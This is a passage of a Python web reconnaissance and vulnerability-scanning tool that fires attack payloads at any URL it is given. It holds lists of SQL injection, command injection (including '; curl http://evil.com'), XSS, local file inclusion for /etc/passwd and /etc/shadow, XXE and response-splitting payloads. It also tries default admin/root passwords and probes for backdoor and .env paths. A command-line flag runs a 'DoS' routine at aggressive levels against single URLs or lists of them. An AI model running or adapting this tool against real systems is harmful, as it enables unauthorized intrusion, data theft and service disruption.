                and any(kw in content for kw in ["login", "password", "username", "auth", "signin"])
                and abs(len(res.text) - baseline_len) > 100
                and title != baseline_title
            ):
                print(f"{Fore.CYAN}[+] Possible login page: {test_url} [{res.status_code}] - Title: {title}{Fore.RESET}")
                found.append(test_url)

        except Exception:
            continue

    if not found:
        print(f"{Fore.GREEN}[-] No common login/admin paths found.{Fore.RESET}\n")


def extract_title(html):
    import re
    match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    return match.group(1).strip() if match else ""
    
    
# VULN TEST

def test_injection_vulnerabilities(url, level=None):
    print(f"{Fore.MAGENTA}[ INJECTION & VULN SCANNER ]\n")
    print(f"{Fore.YELLOW}[+] Testing verified and heuristic injection payloads on {url}...{Fore.RESET}")

    verified_vulnerable = []
    possible_vulnerable = []

    try:
        level = int(level) if level else 5
        if not 1 <= level <= 5:
            raise ValueError
    except ValueError:
        print(f"{Fore.RED}[-] Invalid level. Use --injection 1-5.{Fore.RESET}")
        return

    tests = {
        "SQLi Boolean-Based": {
            "true": "' OR 1=1--",
            "false": "' AND 1=0--",
            "check": lambda t, f: abs(t - f) > 30
        },
        "SQLi Time-Based": {
            "payload": "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "check": lambda rtt: rtt >= 4.5
        },
        "RCE Time-Based": {
            "payload": "; sleep 5",
            "check": lambda rtt: rtt >= 4.5
        },
        "LFI": {
            "payload": "../../../../etc/passwd",
            "check": lambda body: "root:x:0:0:" in body
        },
        "XSS Reflective": {
            "payload": "<script>confirm(1337)</script>",
            "check": lambda body, payload: payload.lower() in body
        },
        "XXE": {
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>""",
            "check": lambda body: "root:x:0:0:" in body
        },
        "Command Injection": {
            "payload": "; id",
            "check": lambda body: re.search(r"uid=\d+", body)
        },
        "SSRF": {
            "payload": "http://127.0.0.1:80",
            "check": lambda body: "localhost" in body or "Apache" in body
        },
        "Broken Auth": {
            "payload": [("admin", "admin"), ("root", "root")],
            "check": lambda res: "logout" in res.text.lower() or "dashboard" in res.text.lower()
        },
        "Clickjacking": {
            "check": lambda headers: "x-frame-options" not in headers
        },
        "HTTP Response Splitting": {
            "payload": "%0d%0aSet-Cookie:%20evil=1",
            "check": lambda headers: any("evil=1" in v for v in headers.get("Set-Cookie", []))
        },
        "File Upload": {
            "payload": "/upload.php",
            "check": lambda body: "upload successful" in body.lower()
        }
    }

    extended_payloads = {
        "SQLi": [
            "' OR '1'='1", "';--", "\" OR \"1\"=\"1", "' OR 1=1 --",
            "' AND 1=0 UNION SELECT null,null--", "' UNION SELECT user, pass FROM users--",
            "' OR EXISTS(SELECT * FROM admins)--", "' AND sleep(5)--", "' OR 1=1#", "') OR ('1'='1",
            "' OR 1=CONVERT(int, (SELECT @@version))--", "' OR updatexml(null,concat(0x3a,user()),null)--"
        ],
        "RCE": [
            "; ping -c 1 127.0.0.1", "|| ls", "`whoami`", "$(whoami)",
            "; curl http://evil.com", "& nslookup google.com", "&& whoami",
            "| id", "| uname -a", "`id`", "`uname -a`", "; bash -c 'id'", "|| whoami"
        ],
        "XSS": [
            "<script>alert(1)</script>", "'\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<svg><script>alert(1)</script>",
            "<input onfocus=alert(1) autofocus>", "<math><mi xlink:href=\"javascript:alert(1)\">X</mi></math>"
        ],
        "LFI": [
            "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../../../../../../../../../../etc/shadow",
            "/proc/self/environ", "../../../../var/log/apache2/access.log", "../../../../../../../../etc/passwd%00",
            "php://input", "php://filter/convert.base64-encode/resource=index.php"
        ],
        "Metasploitable": [
            "/phpmyadmin", "/dvwa", "/mutillidae", "/cgi-bin/test.cgi", "/webdav/",
            "/test.php", "/admin/", "/cgi-bin/status", "/shell.php", "/backdoor.php"
        ],
        "ExposedPaths": [
            "/.env", "/config.php", "/config.json", "/.git/", "/backup.zip",
            "/db.sql", "/login", "/wp-login.php", "/phpinfo.php",
            "/debug.log", "/uploads/", "/logs/", "/error.log"
        ]
    }

    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query = parse_qs(parsed.query)
        if not query:
            query = {"vuln": ["test"]}
        param = list(query.keys())[0]

        # === Verifiable ===
        for name, info in tests.items():
            try:
                q = query.copy()

                if name == "SQLi Boolean-Based" and level >= 1:
                    q_true, q_false = q.copy(), q.copy()
                    q_true[param][0] = info["true"]
                    q_false[param][0] = info["false"]
                    r1 = requests.get(base + "?" + urlencode(q_true, doseq=True), timeout=10)
                    r2 = requests.get(base + "?" + urlencode(q_false, doseq=True), timeout=10)
                    if info["check"](len(r1.text), len(r2.text)):
                        verified_vulnerable.append((name, info["true"]))

                elif name in ["SQLi Time-Based", "RCE Time-Based"] and level >= 3:
                    q[param][0] = info["payload"]
                    t0 = time.time()
                    requests.get(base + "?" + urlencode(q, doseq=True), timeout=10)
                    if info["check"](time.time() - t0):
                        verified_vulnerable.append((name, info["payload"]))

                elif name == "LFI" and level >= 1:
                    q[param][0] = info["payload"]
                    res = requests.get(base + "?" + urlencode(q, doseq=True), timeout=10)
                    if info["check"](res.text):
                        verified_vulnerable.append((name, info["payload"]))

                elif name == "XSS Reflective" and level >= 1:
                    q[param][0] = info["payload"]
                    res = requests.get(base + "?" + urlencode(q, doseq=True), timeout=10)
                    if info["check"](res.text, info["payload"]):
                        verified_vulnerable.append((name, info["payload"]))

                elif name == "Clickjacking" and level >= 2:
                    res = requests.get(base, timeout=10)
                    if info["check"](res.headers):
                        verified_vulnerable.append((name, "[Missing X-Frame-Options]"))

                elif name in ["XXE", "Command Injection", "SSRF", "Broken Auth", "HTTP Response Splitting", "File Upload"] and level >= 2:
                    q[param][0] = info["payload"]
                    res = requests.get(base + "?" + urlencode(q, doseq=True), timeout=10)
                    if info["check"](res.text if name != "HTTP Response Splitting" else res.headers):
                        verified_vulnerable.append((name, info["payload"]))

            except Exception:
                continue

        # === Heuristic ===
        filtered = [
            (c, p) for c, lst in extended_payloads.items()
            if c not in ["Metasploitable", "ExposedPaths"]
            for p in lst
            if (c == "SQLi" and level >= 2) or
               (c == "XSS" and level >= 2) or
               (c == "RCE" and level >= 4) or
               (c == "LFI" and level >= 4)
        ]

        with tqdm(total=len(filtered), desc="Heuristic Scanning", ncols=100, colour="magenta") as bar:
            for category, payload in filtered:
                try:
                    q = query.copy()
                    q[param][0] = payload
                    res = requests.get(base + "?" + urlencode(q, doseq=True), timeout=7)
                    body = res.text.lower()

                    if category == "SQLi" and any(e in body for e in ["sql syntax", "you have an error", "warning: mysql"]):
                        possible_vulnerable.append((category, payload))
                    elif category == "XSS" and payload.lower() in body:
                        possible_vulnerable.append((category, payload))
                    elif category == "RCE" and any(i in body for i in ["uid=", "gid=", "root"]):
                        possible_vulnerable.append((category, payload))
                    elif category == "LFI" and any(p in body for p in ["root:x:0:", "[fonts]", "localhost"]):
                        possible_vulnerable.append((category, payload))
                except:
                    pass
                finally:
                    bar.update(1)

        # Path discovery
        if level >= 5:
            path_payloads = extended_payloads["Metasploitable"] + extended_payloads["ExposedPaths"]
            with tqdm(total=len(path_payloads), desc="Path Discovery", ncols=100, colour="cyan") as bar:
                for p in path_payloads:
                    try:
                        res = requests.get(f"{parsed.scheme}://{parsed.netloc}{p}", timeout=7)
                        if res.status_code == 200 and len(res.text) > 20:
                            possible_vulnerable.append(("PathExposure", p))
                    except:
                        pass
                    finally:
                        bar.update(1)

    except Exception as e:
        print(f"{Fore.RED}[-] Error during testing: {e}{Fore.RESET}")
        return

    # === Resultados ===
    if verified_vulnerable:
        print(f"{Fore.RED}\n[+] Verified Vulnerabilities Found:")
        for name, payload in verified_vulnerable:
            print(f"  - {name}: {Fore.CYAN}{payload}{Fore.RESET}")

    if possible_vulnerable:
        print(f"{Fore.YELLOW}\n[!] Possible Vulnerabilities Detected:")
        for name, payload in possible_vulnerable:
            print(f"  - {name}: {Fore.BLUE}{payload}{Fore.RESET}")

    if not verified_vulnerable and not possible_vulnerable:
        print(f"{Fore.GREEN}\n[-] No vulnerabilities detected.{Fore.RESET}")




# Main function
def main():
    parser = argparse.ArgumentParser(description="Web Recon & Security Analyzer")
    parser.add_argument("-U", "--url", type=str, help="URL to check")
    parser.add_argument("-f", "--file", type=str, help="File containing URLs")
    parser.add_argument("-p", "--ports", action="store_true", help="Scan ports")
    parser.add_argument("-s", "--ssl", action="store_true", help="Check SSL/TLS version")
    parser.add_argument("-H", "--headers", action="store_true", help="Display headers")
    parser.add_argument("-P", "--proxy", type=str, help="Proxy server to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-sL", "--subdomains", action="store_true", help="Enumerate subdomains using Sublist3r")
    parser.add_argument("-dW", "--detect-waf", action="store_true", help="Detect presence of WAF")
    parser.add_argument("-l", "--find-login", action="store_true", help="Detect common login/admin pages")
    parser.add_argument("-i", "--injection", type=int, choices=range(1, 6), metavar="[1-5]", help="Scan for injection vulnerabilities (level 1-5)")
    parser.add_argument("-dC", "--dos-check", type=int, choices=[1, 2, 3], metavar="[1-3]", help="Simulate a DoS attack level (1: light, 2: medium, 3: aggressive)")


    args = parser.parse_args()
    injection_flag = args.injection

    # Display banner
    display_random_banner()

    if args.url:
        if args.dos_check:
            simulate_dos(args.url, proxy=args.proxy, level=args.dos_check)
        else:
            status_code, response_time, headers = check_url_status(args.url, args.proxy)
            ip = get_ip_from_url(args.url)
            ssl_version, ssl_color, cert_info = (None, None, None)

            if status_code and args.ssl:
                ssl_version, ssl_color, cert_info = check_ssl(args.url)

            status_message = get_status_message(status_code) if status_code else "Unavailable"
            status_color = get_status_color(status_code) if status_code else Fore.RED

            if status_code:
                logging.info(f"{args.url:<50} -IP:  {ip:<15} - {status_color}{status_message} ({status_code}){Style.RESET_ALL}")
            else:
                logging.info(f"{args.url:<50} -IP:  {ip:<15} - {status_color}Unavailable{Style.RESET_ALL}")

            if ssl_version:
                logging.info(f"SSL: {ssl_color}{ssl_version}{Style.RESET_ALL}")

            if cert_info:
                print(cert_info)

            if args.headers:
                check_headers(args.url, args.proxy)

            if args.ports:
                open_ports = scan_ports(ip)
                logging.info("\n[----------------PORTS SCAN RESULTS----------------]")
                for port_info in open_ports:
                    logging.info(port_info)
                logging.info("[------------------------END------------------------]\n")

            if args.subdomains:
                parsed_url = urlparse(args.url)
                domain = parsed_url.netloc or parsed_url.path
                domain = domain.replace("www.", "")

                logging.info(Fore.MAGENTA + "\nScanning for subdomains...\n")
                subdomains = enumerate_subdomains(domain)

                logging.info("[SUBDOMAINS]")
                if subdomains:
                    for sub in subdomains:
                        logging.info(Fore.CYAN + f" - {sub}")
                else:
                    logging.info(Fore.RED + "No subdomains found.")
                logging.info("[END]\n")

            if args.detect_waf:
                detect_waf(args.url)

            if args.find_login:
                detect_login_pages(args.url)

            if args.injection:
                print(f"\n{Fore.BLUE}{'-'*60}{Fore.RESET}")
                print(f"{Fore.GREEN}[+] SCANNING INJECTION ON: {args.url}{Fore.RESET}")
                print(f"{Fore.BLUE}{'-'*60}{Fore.RESET}")
                test_injection_vulnerabilities(args.url, level=args.injection)
          
   
           

    elif args.file:
        if args.dos_check:
            with open(args.file, 'r') as file:
                urls = file.readlines()
            for url in urls:
                simulate_dos(url.strip(), proxy=args.proxy, level=args.dos_check)
        else:
            check_urls_from_file(
                filename=args.file,
                proxy=args.proxy,
                check_ssl_flag=args.ssl,
                check_headers_flag=args.headers,
                scan_ports_flag=args.ports,
                enumerate_subdomains_flag=args.subdomains,
                detect_waf_flag=args.detect_waf,
                find_login_flag=args.find_login,
                injection_flag=args.injection,
                dos_check_flag=bool(args.dos_check)
            )



# Entry point
if __name__ == "__main__":
    main()
